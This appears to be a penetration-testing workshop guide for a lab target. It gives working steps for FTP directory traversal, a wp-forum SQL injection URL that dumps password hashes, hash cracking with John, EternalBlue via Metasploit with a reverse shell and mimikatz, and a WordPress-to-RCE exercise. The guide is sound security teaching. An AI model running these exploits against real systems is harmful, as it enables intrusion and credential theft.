# Introduction

In this workshop you will be using open source tools to gain access to (i.e. hack) a remote host (i.e. computer). The workshop is organized into 2 main parts. First, there are 4 beginner challenges that are accompanied by thorough walkthroughs. These are:

1. [FTP / Directory Traversal](#ftp--directory-traversal)
2. [HTTP / Vulnerable Web Sites](#http--vulnerable-web-sites)
3. [Hash Cracking](#hash-cracking)
4. [SMB / MS17-010](#smb--ms17-010)

For participants who get through the first four challenges quickly and wish to try their hand at slight more advanced exploits, 2 additional challenges are provided. They are not as thoroughly outlined but a goal is set, and references are provided that will allow them to figure out how to achieve those goals. These are:

- [SQLI](#sqli)
- [PHP / RCE using Wordpress](#php--rce-using-wordpress)

The latter challenges take a deeper dive into aspects of the earlier challenges and can be completed in any order after the first 4.

## Rules

1. Do not attack any hosts other than your assigned target. 
2. Do not attack the infrastructure.
3. Do not use the infrastructure for anything other than the prescribed activities. E.g., don't use workshop resources to browse social media, mine cryptocurrency, do your schoolwork, etc.
4. Do not use the tool covered in this workshop against systems that you are unauthorized to attack / pentest. DOING SO IS A FEDERAL CRIME AND WILL CARRY SIGNIFICANT CRIMINAL PENALTIES. 

We are completely OK with you breaking stuff as you learn, so don't be afraid to try things not explicitly covered by the facilitators. However, violating the above intentionally or in a manner which is disruptive to other participants is grounds for immediate removal from the workshop.

# Setup

You may complete this workshop using one of the provided laptops or your own. At a minimum, you will need a system with an SSH client and a remote desktop client. Depending on what type of system you're on, the following programs will meet these requirements.

OS | SSH | Remote Desktop
------------ | ------------ | -------------
Linux | ssh (built-in) | [rdesktop](http://www.rdesktop.org/)
Windows | [Bitvise SSH Client](https://www.bitvise.com/ssh-client) | Remote Desktop (built-in)
ChromeOS | [Secure Shell](https://chrome.google.com/webstore/detail/secure-shell/pnhechapfaindjhompbnflcldabbghjo) | [Chrome RDP](https://chrome.google.com/webstore/detail/chrome-rdp/cbkkbcmdlboombapidmoeolnmdacpkch)
OSX | ssh (built-in) | [CoRD](http://cord.sourceforge.net/)

Each workstation should have assigned to it a set of 4 IP addresses.

- You (external): machine you will be SSHing into to access your offensive tools
- You (internal): don't worry about this for now
- Target (external): host you will be attacking
- Target (internal): don't worry about this for now

If you are using your own hardware, just ask one of the facilitators for a set of IPs to work with.

When you are ready, SSH into your workstation using either (1) the provided private key, or (2) the password: CorrectBatteryHorseStaple

For GUI based SSH clients, just fill in the appropriate blanks. For command line clients (CLI), the syntax will look something like:

```bash
# using private key
ssh -i haxdemo.pub [IP]

# using password
ssh [IP]
```

# Scanning / Enumeration

First we need to figure out what is running on your target / what it even is. Is it someone's personal Macbook? A Linux based webserver in some server farm? A Windows server handling corporate email? A SCADA system controlling uranium enriching machines? Each of these will look very different and give rise to different attack vectors.

Nmap is a tool used for network discovery and scanning. In this case, we already know the address of our target so we will use the tool to see what is going on with the target from a network perspective. At its most basic, nmap lets us see what ports are open on the target system. 

```bash
nmap [IP] -A -p20-450,3389
```

Ok, we see that ports 21, 80, 135, 445, and 3389 are open. These ports are commonly associated with FTP, HTTP, SMB and RDP. On our target system there are one or more vulnerable services on each port. We will investigate each in turn.

# What's our goal?

Let's first see what our ultimate goal is. Remote desktop (RDP) is a service used by Windows based machines to provide GUI based interactivity over networks. The machine providing the connection typically listens on port 3389 for incoming connections, which is why we suspect (though don't know for sure yet) this machine provides the service. From your physical machine, try connecting to the machine via RDP. On Windows based hosts, type "remote desktop" into the search / run bar and fill in the blanks. For CLI, try something like:

```bash
rdesktop [target external IP]
```

You should see a familiar screen (if you've ever used a Windows machine). However, we are stopped at the gates because we don't have credentials for the box. At this point, we know there is something potentially interesting here but we don't know how interesting, or how to get that interesting stuff. For now, our goal is to answer these questions. We will do so by exploiting vulnerabilities in the services hosted by this box.

# FTP / Directory Traversal

First let's consider the FTP service. The file transfer protocol (FTP) is an ancient protocol (i.e. manner of communication defined by ports, syntax, and behavior) that is used by computers to, you guessed it, transfer files. While it is very reliable, it provides only a modicum of security because it is from a different era, before cyber security was really a thing. Most problematically, it is a protocol that may be implemented by anyone which means that it will be as secure as the person implementing the software makes it. I.e., it's a exploitable service even when implemented perfectly but when done poorly, it is basically Swiss cheese.

The following is the part of the nmap output that pertains to the FTP service on our target box. 

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Acritum Femitter Server ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Nmap says that this particular FTP server is probably Acritum Femitter, an older piece of software that runs on Windows based hosts. Log in to the FTP server by typing `ftp [target ip]` and using whatever username you wish (since anonymous logins are allowed). Then try typing in `ls`. What do you see?

Doing a little bit of googling reveals that Femitter is vulnerable to a simple directory traversal exploit. Check out one of the reports on [ExploitDB](https://www.exploit-db.com/exploits/15445/). Now try typing in the following:

```bash
ls ../
ls ../../
ls ../../../
ls ../../../Users/
ls ../../../Users/Administrator
```

You now have read access to much if not all of the files on your target host!

### Critical Thinking
1. What traction does this simple exploit get us on this system?
2. While we can see a whole lot, we still can't write or execute using this exploit by itself. What limitations does this impose?

# HTTP / Vulnerable Web Sites

Next let's consider the HTTP(?) service being hosted on port 80. The hypertext transfer protocol (HTTP) is what powers websites. All the fancy websites that we see on the modern Internet still rely on the several decades old markup language that is HTTP to tell our browsers how they want to look. As with FTP, HTTP servers can have security gaps due to poor implementation. However, an even greater threat to servers hosting websites is that even if the server software is relatively secure, the websites they are serving may present huge vulnerabilities (as we will see shortly).

Let's see what's actually on our target's web server. The target's HTTP port is not exposed to the world for security reasons, so you'll need to view the website through your virtual (attacking) host. Open an RDP session to your attacking host (e.g. `rdesktop [your external IP]`) and point its browser to your target's internal IP address. You should see three folders; for now we will focus on "wp46".

Clicking on the "wp46" link takes us to what appears to be a Wordpress site. For those unfamiliar, Wordpress is a highly popular CMS (content management platform) that is notorious for vulnerabilities both through its core code, as well as its myriad 3rd party plugins. I.e., this is promising. Because it is basically a blogging platform, Wordpress must provide a way for users to publish their blogs (i.e. send content to the server). This is done via an admin interface, which in default installations of WP is accessible via http://[server address]/wp-admin. Try that now.

Looks like a standard install, at least in this sense, but we'll need creds. Based on the name of the folder, we might guess that this is a site built on Wordpress 4.6 but we can make sure (sort of)
by checking some of the default files included with any installation of Wordpress. Check out http://[server address]/readme.html. Also, take a look at http://[server address]/wp-content/plugins.

We can use what we see here to check whether any off-the-shelf exploits are available for this particular setup. We can do this manually doing a whole lot of reading, or we can use a handy tool called WPScan. WPscan checks all the characteristics of a particular Wordpress install against a database of known vulnerabilities to see whether any potentially match.

Open an SSH session to your attacking host and type the following.

```bash
wpscan http://[target internal IP]/wp46 --enumerate ap
```

This points the tool at the WP site we see and tells the tool to check for all known plugin vulnerabilities. This may take a few minutes but at the end of it, you will get a whole lot of output. While some or even many of the hits that come up will work against this system, they will mostly not be super helpful or require very specific conditions to work. However, there is one vulnerability in this system that is glaring. Towards the bottom, you will see an entry for a plugin called "wp-forum".

```
[+] Name: wp-forum
 |  Location: http://10.0.0.111/wp46/wp-content/plugins/wp-forum/
[!] Directory listing is enabled: http://10.0.0.111/wp46/wp-content/plugins/wp-forum/

[!] We could not determine a version so all vulnerabilities are printed out

[!] Title: wp-forum - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6732
    Reference: http://cxsecurity.com/issue/WLB-2013020035
```

Take a look at either of the websites the entry links to. It's ok if you don't understand how the attack works for now. However, can you tell whether we can apply this attack against the website we've found (hint: yes we can!)? Try putting the following into the browser of your rdesktop session:

```
http://[target private IP]/wp46/wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat(user_login,0x3a,user_pass)+from+wp_users%23
```

What you are seeing are the login names and hashed passwords for all the accounts on this WP site! While this is an amazing exploit, we aren't done yet. Hashed passwords aren't much use to us in their current form because we can't use them to log into the backend. What we need to do is crack them to get the actual passwords that generated them.

To further understand how/why this attack works, try your hand at the advanced exercise, [SQLI](#sqli).

### Critical Thinking
1. At an abstract level, what does a tool like WPScan do for us with respect to vulnerabilities and exploits?
2. Even though we can't log into the site yet with just the usernames and hashes, what are some of the dangers resulting from this disclosure?

# Hash Cracking

We will use a tool known as John the Ripper ("john" for short) to crack the hashes. A hash is a unique sequence that is generated by putting some other sequence through what is known as a hash function. They have some very interesting properties.

1. While you can put anything you want into a hash function, what comes out will always be the same length (given the same hash function), 
2. The output will be the same every time given the same input. 
3. The probability of two different inputs resulting in the same output is infinitisimally small.
4. You can't "unhash" in the same way that you can decrypt something that has been encrypted. I.e., hashs are one way.

This last property means that "cracking" a hash can only be done by taking all possible inputs, putting them through the same hashing function, and comparing them to the hash in question until the same hash is found. This is what programs like john do for us - we feed it the hash we want to crack, a list of possible words that we think may be the unhashed input, and the type of hash function used (which can be inferred from characteristics of the hash itself).

Let's run the hash we found from the Wordpress site through john. Type the following into the console of your attacking box:

```bash
cd ~
printf '$P$BpSB2/Dfwq.m/ow80YFL4vALF5z4Yi.' > wp46.hash
john -wordlist:/usr/share/wordlists/rockyou.txt wp46.hash
```

You should see output like the following:

```
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
covfefeinthemorning (?)
1g 0:00:00:00 DONE (2017-07-28 21:20) 1.492g/s 4011p/s 4011c/s 4011C/s cartoon..sadie1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Basically, john recognized the hash function to be of type phpass, then hashed every word in the wordlist using that function until it found the input that gave the same hash as the one we were examining. Apparently, this user really loves his 'covfefeinthemorning' (whatever that means).

Now we can log into the backend of the Wordpress site! Go ahead and explore a bit. If you have basic familiarity with Wordpress, you know that we can now publish whatever we want on this website. More scary is the fact that the user whose account you've accessed is a super admin, so if you know a bit about the internal workings of Wordpress, you now have what is known as RCE (remote code execution) access to the underlying host that is serving the code. Basically, this means that you now own this computer. While going down this road is a tad bit beyond the scope of this exercise, if you are curious, you may further explore this avenue in the exercise [PHP / RCE using Wordpress](#php--rce-using-wordpress). 

### Critical Thinking
1. What is the difference between hashing and encryption?
2. Why bother hashing if attackers can just feed them into a program like john? I.e. what are the limitations of hash cracking?

# SMB / MS17-010

Finally let's explore the SMB service that is provided on ports 135 and 445. SMB is an old and storied protocol that has been around for as long as Windows, and is used mainly by that OS to provide network services, viz. file sharing, printing and interprocess communications, across hosts on the same network. It's gone through several major overhauls over the years so there are now 3+ versions of the protocol, each improving functionality and security. However, you will often see older versions of the protocol running in the wild due to backwards compatibility issues.

Recently, it's been all over the news for 2 reasons. In April 2017, the hacker group Shadow Brokers released a batch of illegally obtained NSA hacking tools, among which was an exploit code named Eternal Blue. Eternal Blue exploits a buffer overflow in SMBv1 to achieve inject arbitrary code into the memory of a target Windows system. Used in conjunction with another exploit in the Shadow Brokers disclosure known as Double Pulsar, an attacker can gain RCE. 

The exploit gained notoriety a scarce month after its disclosure due to its use in a piece of malware known as WannaCrypt, and more recently in the malware known as NotPetya. Both these attacks leverage the MS17-010 vulnerability to gain access to the victim system, then encrypt the target's file system in a type of attack known as ransomware.

MS17-010 is the name of the patch released by Microsoft to close this vulnerability. However, Windows 7 and Server 2008 systems which have not applied this patch are still vulnerable to attacks using this vector. We will check whether our target system is vulnerable to the attack and if so, exploit it.

We will use a tool known as the Metasploit framework. First, start the tool by typing `msfconsole` into your attacking host console. Then type the following into msfconsole:

```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set rhost [target's internal ip]
set lhost [your internal ip]
run

```

This may not work the first time. If it doesn't, type `run` again. If it continues to fail, ask for assistance from a facilitator. 

These commands tell the metasploit framework to load an attack based on the MS17-010 vulnerability and give you a reverse TCP shell to the target system. In short, this grants you a shell on the target system. Due to the nature of the target system, this means that you now have total control of the system. To see the power of this attack, once the exploit has succeeded, type the following:

```
load mimikatz
wdigest
```

You should now have the password for the system! Now return to the RDP connection to the target system from earlier. You should be able to log in using the credentials you found. Congratulations! At this point you have hacked the target and have complete ownership of the system. 

### Critical Thinking
1. What is the easiest way to protect yourself from well-known exploits such as Eternal Blue?
2. Why is it fundamentally irresponsible to disclose critical vulnerabilities like the Shadow Brokers? 

# SQLI

The WordPress exploit above relies on a category of attacks known as SQL Injection (SQLI). In this exercise, you will gain a better understanding of SQLI by exploiting a web app vulnerable to standard SQLI and an advanced form known as blind SQLI.

#### Goals
1. Use standard SQLI to get access to the administrator password hash in the webapp at http://[target private IP]/widgetco1
2. (Optional) Crack the hash using john
3. Use blind SQLI to get access to the plaintext administrator password in the webapp at http://[target private IP]/widgetco2

#### References
- [OWASP SQLI explanation](https://www.owasp.org/index.php/SQL_Injection)
- [Guru99 SQLI Tutorial](https://www.guru99.com/learn-sql-injection-with-practical-example.html)
- [SQLite table meta data](https://stackoverflow.com/questions/6460671)
- [OWASP Blind SQLI explanation](https://www.owasp.org/index.php/Blind_SQL_Injection)

# PHP / RCE using Wordpress

Once you have access to an admin account in WP, you can gain RCE on the host, thereby pwning the host. This is due to the fact that an admin account in WP can directly edit the underlying PHP code, which means you can arbitrarily execute system commands.

#### Goals
1. Alter the PHP code of WP to execute arbitary binaries.
2. Craft a Metasploit payload that will grant us a reverse_tcp shell on the target system.
3. Execute the payload on the target system and gain a meteterpreter shell.

#### References
- [Editing WP PHP code](https://codex.wordpress.org/Editing_Files#Using_the_Theme_Editor_and_Plugin_Editor)
- [Executing system commands with PHP](http://php.net/manual/en/function.exec.php)
- [Creating Metasploit payloads](https://netsec.ws/?p=331)

